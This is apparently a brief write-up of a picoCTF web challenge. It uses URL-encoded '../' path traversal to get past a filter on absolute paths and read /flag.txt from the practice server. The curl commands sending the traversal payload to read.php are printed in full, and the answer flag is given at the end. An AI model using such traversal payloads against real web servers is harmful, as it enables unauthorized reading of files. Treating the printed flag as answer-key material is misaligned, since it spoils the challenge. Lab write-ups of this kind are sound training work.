Description:
Can you get the flag?
Here's the website: http://saturn.picoctf.net:50561/
We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

- We know from the description the path of the flag is 4 directorys backwards.

- I will do this with curl.
'''
curl 'http://saturn.picoctf.net:50561/read.php' --data-raw 'filename=..%2F..%2F..%2F..%2Fflag.txt&read=' --compressed --insecure
'''
- Found the flag and now will add grep to isolate only the flag

curl 'http://saturn.picoctf.net:50561/read.php' --data-raw 'filename=..%2F..%2F..%2F..%2Fflag.txt&read=' --compressed --insecure | grep -oE "picoCTF{.*}"

flag = picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}
